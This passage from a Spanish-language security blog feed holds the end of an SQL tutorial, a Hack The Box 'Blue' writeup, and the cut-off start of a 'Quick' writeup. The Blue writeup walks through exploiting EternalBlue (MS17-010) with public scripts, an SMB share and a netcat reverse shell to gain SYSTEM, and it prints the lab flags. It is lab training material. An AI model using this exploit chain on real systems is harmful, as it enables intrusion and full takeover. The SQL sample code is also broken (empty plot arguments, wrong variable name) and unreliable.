&lt;p&gt;Despues solo debemos agruparlo basandonos en el &lt;code&gt;EmployeeID&lt;/code&gt; ya que justamente queremos saber el empleado que genero esos ingresos y finalmente debemos ordenarlo por el &lt;code&gt;total_vendido&lt;/code&gt; y establecer un &lt;code&gt;LIMIT&lt;/code&gt; de los tres primeros.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query108.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Finalmente debemos añadir esa consulta a nuestra variable &lt;code&gt;consulta&lt;/code&gt; en nuestro codigo y completar tambien los parametros que faltaban en el &lt;code&gt;plot&lt;/code&gt; donde &lt;code&gt;x=Empleado&lt;/code&gt; y &lt;code&gt;y=total_vendido&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;import sqlite3
import pandas as pd
import matplotlib.pyplot as plt

consulta = '''
  SELECT Firstname || &quot;&quot; || LastName as Empleado, SUM(od.Quantity * p.Price) AS total_vendido
  FROM Employees e
  JOIN Orders o ON e.EmployeeID = o.EmployeeID
  JOIN OrderDetails od ON o.OrderID = od.OrderID
  JOIN Products p ON od.ProductID = p.ProductID
  GROUP BY e.EmployeeID
  ORDER BY total_vendido DESC
  LIMIT 3
'''
with sqlite3.connect(&quot;Northwind.db&quot;) as conn:

    resultado = pd.read_sql_query(query, conn)

resultado.plot(x=, y=, kind=&quot;bar&quot;, figzise=(10,5), legend=False)
plt.title(&quot;Empleado que genero mas Ingresos&quot;)
plt.xlabel(&quot;Nombre Empleado&quot;)
plt.ylabel(&quot;Monto Total Vendido&quot;)
plt.xticks(rotation=45)
plt.show()
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;El codigo en &lt;code&gt;python&lt;/code&gt; nos quedaria de esta manera, ahora solo debemos ejecutarlo y obtendremos graficamente los tres empleados que generaron mas ingresos a la empresa.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query109.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Y esto seria todo con respecto al curso de &lt;code&gt;SQL&lt;/code&gt;, ahora si estas listo para administrar cualquier base de datos &lt;code&gt;SQL&lt;/code&gt;, espero haberte ayudado. 😃&lt;/p&gt;

&lt;p&gt;Conmigo sera hasta la proxima vez 😄.&lt;/p&gt;

</description>
        <pubDate>Tue, 20 Jun 2023 00:00:00 +0000</pubDate>
        <link>http://localhost:4000/articulos/SQL</link>
        <guid isPermaLink="true">http://localhost:4000/articulos/SQL</guid>
        
        <category>Sql</category>
        
        <category>programación</category>
        
        <category>Query</category>
        
        <category>Database</category>
        
        
        <category>articulos</category>
        
      </item>
    
      <item>
        <title>Maquina Blue - htb writeup</title>
        <description>&lt;p&gt;El dia de hoy vamos a resolver &lt;code&gt;Blue&lt;/code&gt; de &lt;code&gt;hackthebox&lt;/code&gt; una maquina &lt;code&gt;windows&lt;/code&gt; de dificultad facil, donde explotaremos la famosa vulerabilidad &lt;code&gt;Eternalblue&lt;/code&gt; que afecta a una versión vulnerable del protocolo &lt;code&gt;smb&lt;/code&gt; y mediante la cual podremos realizar ejecución remota de comandos &lt;code&gt;RCE&lt;/code&gt; , esto lo haremos manualmente para comprender mejor la explotación de esta vulnerabilidad y de esta manera ganaremos acceso como el usuario &lt;code&gt;nt authority\system&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Esta maquina es divertida asi que a darle!.&lt;/p&gt;

&lt;p&gt;Vamos a comenzar como siempre creando un directorio con el nombre de la maquina:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ mkdir Blue
❯ ls
 Blue
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Seguidamente con la funcion mkt crearemos nuestros directorios de trabajo:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ which mkt
mkt () {
	mkdir {nmap,content,exploits,scripts}
}
❯ mkt
❯ ls
 content   exploits   nmap   scripts
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;enumeracion&quot;&gt;ENUMERACION &lt;a href=&quot;#enumeracion&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Comenzaremos con la fase de Enumeracion, mandando una traza a la ip de la maquina victima con el comando &lt;code&gt;ping&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ping -c 1 10.10.10.40
PING 10.10.10.40 (10.10.10.40) 56(84) bytes of data.
64 bytes from 10.10.10.40: icmp_seq=1 ttl=127 time=146 ms

--- 10.10.10.40 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 146.307/146.307/146.307/0.000 ms
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Vemos que la maquina nos responde, con un ttl de &lt;code&gt;127&lt;/code&gt; correspondiente a una maquina &lt;code&gt;windows&lt;/code&gt;, ahora procederemos a el escaneo de puertos con la ayuda de &lt;code&gt;nmap&lt;/code&gt;:&lt;/p&gt;

&lt;h3 id=&quot;escaneo-de-puertos&quot;&gt;ESCANEO DE PUERTOS&lt;/h3&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Parámetro&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Descripción&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-p-&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Escaneamos todos los 65535 puertos.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;–open&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Solo los puertos que estén abiertos.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-v&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Permite ver en consola lo que va encontrando (verbose).&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-oG&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Guarda el output en un archivo con formato grepeable para que mediante una funcion de &lt;a href=&quot;https://s4vitar.github.io/&quot;&gt;S4vitar&lt;/a&gt; nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre &lt;code&gt;openPorts&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.40 -oG openPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-18 02:52 GMT
Initiating SYN Stealth Scan at 02:52
Scanning 10.10.10.40 [65535 ports]
Discovered open port 445/tcp on 10.10.10.40
Discovered open port 139/tcp on 10.10.10.40
Discovered open port 135/tcp on 10.10.10.40
Discovered open port 49153/tcp on 10.10.10.40
Discovered open port 49152/tcp on 10.10.10.40
Discovered open port 49156/tcp on 10.10.10.40
Discovered open port 49155/tcp on 10.10.10.40
Discovered open port 49154/tcp on 10.10.10.40
Discovered open port 49157/tcp on 10.10.10.40
Completed SYN Stealth Scan at 02:52, 20.40s elapsed (65535 total ports)
Nmap scan report for 10.10.10.40
Host is up, received user-set (0.22s latency).
Scanned at 2023-06-18 02:52:13 GMT for 20s
Not shown: 65193 closed tcp ports (reset), 333 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE      REASON
135/tcp   open  msrpc        syn-ack ttl 127
139/tcp   open  netbios-ssn  syn-ack ttl 127
445/tcp   open  microsoft-ds syn-ack ttl 127
49152/tcp open  unknown      syn-ack ttl 127
49153/tcp open  unknown      syn-ack ttl 127
49154/tcp open  unknown      syn-ack ttl 127
49155/tcp open  unknown      syn-ack ttl 127
49156/tcp open  unknown      syn-ack ttl 127
49157/tcp open  unknown      syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 20.51 seconds
           Raw packets sent: 99432 (4.375MB) | Rcvd: 83167 (3.327MB)
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;escaneo-de-version-y-servicios&quot;&gt;ESCANEO DE VERSION Y SERVICIOS.&lt;/h3&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -sCV -p135,139,445,49152,49153,49154,49155,49156,49157 10.10.10.40 -oN targeted
Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-18 03:00 GMT
Nmap scan report for 10.10.10.40
Host is up (0.31s latency).

PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2023-06-18T03:01:39
|_  start_date: 2023-06-18T02:43:00
| smb2-security-mode: 
|   2.1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: haris-PC
|   NetBIOS computer name: HARIS-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2023-06-18T04:01:42+01:00
|_clock-skew: mean: -19m57s, deviation: 34m36s, median: 0s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 79.42 seconds
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Visulizamos información interesante de los puertos escaneados y que el equipo corresponde a una maquina &lt;code&gt;Windows 7&lt;/code&gt;:&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Puerto&lt;/th&gt;
      &lt;th&gt;Servicio&lt;/th&gt;
      &lt;th&gt;Versión&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;135&lt;/td&gt;
      &lt;td&gt;RPC&lt;/td&gt;
      &lt;td&gt;Microsoft Windows RPC&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;139&lt;/td&gt;
      &lt;td&gt;LDAP&lt;/td&gt;
      &lt;td&gt;Microsoft Windows netbios-ssn&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;445&lt;/td&gt;
      &lt;td&gt;SMB&lt;/td&gt;
      &lt;td&gt;Windows 7 Professional 7601 Service Pack 1 microsoft&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;49152-49157&lt;/td&gt;
      &lt;td&gt;MSRPC&lt;/td&gt;
      &lt;td&gt;Microsoft Windows RPC&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h2 id=&quot;explotación&quot;&gt;EXPLOTACION &lt;a href=&quot;#explotación&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Vamos a comenzar utilizando los scripts internos de nmap &lt;code&gt;vuln and safe&lt;/code&gt;, para activar el escaneo de vulnerabilidades de forma segura.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ nmap --script &quot;vuln and safe&quot; -p445 10.10.10.40 -oN targeted
Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-18 03:07 GMT
Nmap scan report for 10.10.10.40
Host is up (0.13s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx

Nmap done: 1 IP address (1 host up) scanned in 4.50 seconds
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;El escaneo nos reporta que el servicio es vulnerable a &lt;code&gt;MS17-010&lt;/code&gt; que corresponde a una ejecución remota de comandos.&lt;/p&gt;

&lt;p&gt;Para explotar esta vulnerabilidad vamos a usar un &lt;code&gt;exploit&lt;/code&gt; del repositorio de github de worawit:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/worawit/MS17-010&quot;&gt;https://github.com/worawit/MS17-010&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Vamos a clonar el repositorio y dentro observaremos varios scripts en &lt;code&gt;python&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git clone https://github.com/worawit/MS17-010
Clonando en 'MS17-010'...
remote: Enumerating objects: 183, done.
remote: Total 183 (delta 0), reused 0 (delta 0), pack-reused 183
Recibiendo objetos: 100% (183/183), 113.61 KiB | 476.00 KiB/s, listo.
Resolviendo deltas: 100% (102/102), listo.
❯ cd MS17-010
❯ ls
 shellcode    eternalblue_exploit7.py   eternalchampion_leak.py   eternalromance_leak.py   eternalsynergy_leak.py   mysmb.py         zzz_exploit.py
 BUG.txt      eternalblue_exploit8.py   eternalchampion_poc.py    eternalromance_poc.py    eternalsynergy_poc.py    npp_control.py  
 checker.py   eternalblue_poc.py        eternalchampion_poc2.py   eternalromance_poc2.py   infoleak_uninit.py       README.md
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Usaremos el &lt;code&gt;checker.py&lt;/code&gt; para poder enumerar los &lt;code&gt;namedpipes&lt;/code&gt; vulnerables.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Named Pipe: Una named pipe es un canal de comunicaciones half-duplex o full-duplex entre un servidor pipe y uno o más clientes. Todas las instancias de una named pipe comparten el mismo nombre, pero cada instancia tiene sus propios búfers y handles y tienen conductos separados para la comunicación cliente-servidor.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ python2 checker.py 10.10.10.40
Target OS: Windows 7 Professional 7601 Service Pack 1
The target is not patched

=== Testing named pipes ===
spoolss: STATUS_ACCESS_DENIED
samr: STATUS_ACCESS_DENIED
netlogon: STATUS_ACCESS_DENIED
lsarpc: STATUS_ACCESS_DENIED
browser: STATUS_ACCESS_DENIED
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Al ejecutarlo vemos que no nos reporta un &lt;code&gt;named pipe&lt;/code&gt; vulnerable, asi que vamos a abrir el &lt;code&gt;checker.py&lt;/code&gt; y vamos a ingresar en las credenciales de invitado &lt;code&gt;guest&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Blue/blue1.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ python2 checker.py 10.10.10.40
Target OS: Windows 7 Professional 7601 Service Pack 1
The target is not patched

=== Testing named pipes ===
spoolss: STATUS_OBJECT_NAME_NOT_FOUND
samr: Ok (64 bit)
netlogon: Ok (Bind context 1 rejected: provider_rejection; abstract_syntax_not_supported (this usually means the interface isn't listening on the given endpoint))
lsarpc: Ok (64 bit)
browser: Ok (64 bit)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Esta vez si nos reporta &lt;code&gt;named pipes&lt;/code&gt; vulnerables, lo siguiente ahora es usar uno de estos en conjunto con el script &lt;code&gt;zzz_exploit.py&lt;/code&gt; donde tambien asignaremos el usuario &lt;code&gt;guest&lt;/code&gt; al igual que en el &lt;code&gt;checker.py&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Blue/blue3.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ python2 zzz_exploit.py
zzz_exploit.py &amp;lt;ip&amp;gt; [pipe_name]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Dentro de &lt;code&gt;zzz_exploit.py&lt;/code&gt;, vamos a introducior el codigo que queremos ejecutar en la maquina victima. El cual nos entablara una conexión a nuestra maquina usando el &lt;code&gt;nc.exe&lt;/code&gt; que ofreceremos mediante un recurso compartido en nuestra maquina.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Blue/blue2.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Para ello primero vamos a descargarnos el ejecutable de &lt;code&gt;nc.exe&lt;/code&gt; de:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://eternallybored.org/misc/netcat/&quot;&gt;https://eternallybored.org/misc/netcat/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Concretamente el &lt;code&gt;netcat 1.12&lt;/code&gt;, lo descomprimimos y usaremos el &lt;code&gt;nc64.exe&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ unzip netcat-win32-1.12.zip -d netcat
Archive:  netcat-win32-1.12.zip
  inflating: netcat/doexec.c         
  inflating: netcat/getopt.c         
  inflating: netcat/netcat.c         
  inflating: netcat/generic.h        
  inflating: netcat/getopt.h         
  inflating: netcat/hobbit.txt       
  inflating: netcat/license.txt      
  inflating: netcat/readme.txt       
  inflating: netcat/Makefile         
  inflating: netcat/nc.exe           
  inflating: netcat/nc64.exe         
❯ cd netcat
❯ ls
 doexec.c   generic.h   getopt.c   getopt.h   hobbit.txt   license.txt   Makefile   nc.exe   nc64.exe   netcat.c   readme.txt
❯ rm nc.exe
❯ mv nc64.exe nc.exe
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ahora ofrecemos un recurso compartido con el nombre de &lt;code&gt;smbFolder&lt;/code&gt; y nos ponemos en escucha en el puerto &lt;code&gt;443&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ impacket-smbserver smbFolder $(pwd) -smb2support
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ejecutamos en &lt;code&gt;zzz_exploit.py&lt;/code&gt; en conjunto con uno de los &lt;code&gt;named pipes&lt;/code&gt; validos, es posible que el exploit deba ejecutarse varias veces.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ python2 zzz_exploit.py 10.10.10.40 samr
Target OS: Windows 7 Professional 7601 Service Pack 1
Target is 64 bit
Got frag size: 0x10
GROOM_POOL_SIZE: 0x5030
BRIDE_TRANS_SIZE: 0xfa0
CONNECTION: 0xfffffa800328a7c0
SESSION: 0xfffff8a008eed2e0
FLINK: 0xfffff8a0081e5088
InParam: 0xfffff8a00818a15c
MID: 0x803
unexpected alignment, diff: 0x5a088
leak failed... try again
CONNECTION: 0xfffffa800328a7c0
SESSION: 0xfffff8a008eed2e0
FLINK: 0xfffff8a0081df088
InParam: 0xfffff8a003aa715c
MID: 0x803
unexpected alignment, diff: 0x4737088
leak failed... try again
CONNECTION: 0xfffffa800328a7c0
SESSION: 0xfffff8a008eed2e0
FLINK: 0xfffff8a0081f8088
InParam: 0xfffff8a0081f115c
MID: 0x803
unexpected alignment, diff: 0x6088
leak failed... try again
CONNECTION: 0xfffffa800328a7c0
SESSION: 0xfffff8a008eed2e0
FLINK: 0xfffff8a008210088
InParam: 0xfffff8a00820a15c
MID: 0x903
success controlling groom transaction
modify trans1 struct for arbitrary read/write
make this SMB session to be SYSTEM
overwriting session security context
creating file c:\pwned.txt on the target
Opening SVCManager on 10.10.10.40.....
Creating service ijHA.....
Starting service ijHA.....
The NETBIOS connection with the remote host timed out.
Removing service ijHA.....
ServiceExec Error on: 10.10.10.40
nca_s_proto_error
Done
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Despues de unos segundos se realiza la petición a nuestro recurso compartido.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ impacket-smbserver smbFolder $(pwd) -smb2support
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.10.10.40,49158)
[*] AUTHENTICATE_MESSAGE (\,HARIS-PC)
[*] User HARIS-PC\ authenticated successfully
[*] :::00::aaaaaaaaaaaaaaaa
[*] Connecting Share(1:IPC$)
[*] Connecting Share(2:smbFolder)
[-] Unknown level for query path info! 0xf
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;y recibimos la conexión directamente como el usuario &lt;code&gt;nt authority\system&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-cmd&quot;&gt;❯ ncat -nlvp 443
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.40.
Ncat: Connection from 10.10.10.40:49159.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32&amp;gt;whoami
whoami
nt authority\system
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;escalada-de-privilegios&quot;&gt;ELEVACION DE PRIVILEGIOS &lt;a href=&quot;#escalada-de-privilegios&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Buscamos de forma recursiva y visualizamos la primera flag &lt;code&gt;user.txt&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-cmd&quot;&gt;C:\Users&amp;gt;cd C:\Users\haris\Desktop
cd C:\Users\haris\Desktop

C:\Users\haris\Desktop&amp;gt;type user.txt
type user.txt
33a8d822f06436dc6144f0a0bbe9a6eb
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Finalmente nos dirigimos al directorio del usuario Administrador y visualizamos la segunda flag &lt;code&gt;root.txt&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-cmd&quot;&gt;C:\Users&amp;gt;cd C:\Users\Administrator\Desktop
cd C:\Users\Administrator\Desktop

C:\Users\Administrator\Desktop&amp;gt;type root.txt
type root.txt
efa091a0be11892c7056beb574c5bd87
&lt;/code&gt;&lt;/pre&gt;

</description>
        <pubDate>Sat, 17 Jun 2023 00:00:00 +0000</pubDate>
        <link>http://localhost:4000/hackthebox/htb-writeup-Blue</link>
        <guid isPermaLink="true">http://localhost:4000/hackthebox/htb-writeup-Blue</guid>
        
        <category>Smb Enumeration</category>
        
        <category>MS17-010</category>
        
        <category>Eternalblue</category>
        
        
        <category>hackthebox</category>
        
      </item>
    
      <item>
        <title>Maquina Quick - htb writeup</title>
        <description>&lt;p&gt;El dia de hoy vamos a estar resolviendo &lt;code&gt;Quick&lt;/code&gt; de &lt;code&gt;hackthebox&lt;/code&gt; una maquina potente &lt;code&gt;linux&lt;/code&gt; de dificultad hard, donde vamos a estar obtener informacion a traves del &lt;code&gt;http3&lt;/code&gt; compilando una version de &lt;code&gt;curl&lt;/code&gt;, con la información obtenida vamos a computar correos para mediante fuerza bruta ganar acceso a un pandel de tickets donde explotaremos una vulnerabilidad en &lt;code&gt;esigate&lt;/code&gt; que nos permitira realizar &lt;code&gt;RCE&lt;/code&gt; para ganar acceso al sistema. En la parte de elevación de privilegios nos aprovecharemos de la mala configuración de una impresora, para secuestrar el contenido que imprime y modificarlo para obtener información y migrar a otro usuario y ya como este podremos leer el contenido de un archivo de configuración que nos dara las credenciales del usuario &lt;code&gt;root&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Es una maquina bastante entretenida asi que a darle!.&lt;/p&gt;

&lt;p&gt;Vamos a comenzar como siempre creando un directorio con el nombre de la maquina:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ mkdir Quick
❯ ls
 Quick
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Seguidamente con la funcion mkt crearemos nuestros directorios de trabajo:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ which mkt
mkt () {
	mkdir {nmap,content,exploits,scripts}
}
❯ mkt
❯ ls
 content   exploits   nmap   scripts
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;enumeracion&quot;&gt;Enumeración &lt;a href=&quot;#enumeracion&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Comenzaremos con la fase de Enumeracion, mandando una traza a la ip de la maquina victima con el comando &lt;code&gt;ping&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ping -c 1 10.10.10.186
PING 10.10.10.186 (10.10.10.186) 56(84) bytes of data.
64 bytes from 10.10.10.186: icmp_seq=1 ttl=63 time=118 ms

--- 10.10.10.186 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 117.913/117.913/117.913/0.000 ms
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Vemos que la maquina nos responde, con un ttl de &lt;code&gt;127&lt;/code&gt;correspondiente a una maquina &lt;code&gt;windows&lt;/code&gt;, ahora procederemos a el escaneo de puertos con la ayuda de &lt;code&gt;nmap&lt;/code&gt;:&lt;/p&gt;

&lt;h3 id=&quot;escaneo-de-puertos&quot;&gt;Escaneo de Puertos&lt;/h3&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Parámetro&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Descripción&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-p-&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Escaneamos todos los 65535 puertos.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;–open&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Solo los puertos que estén abiertos.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-v&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Permite ver en consola lo que va encontrando (verbose).&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-oG&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Guarda el output en un archivo con formato grepeable para que mediante una funcion de &lt;a href=&quot;https://s4vitar.github.io/&quot;&gt;S4vitar&lt;/a&gt; nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre &lt;code&gt;openPorts&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.186 -oG openPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-16 21:46 GMT
Initiating SYN Stealth Scan at 21:46
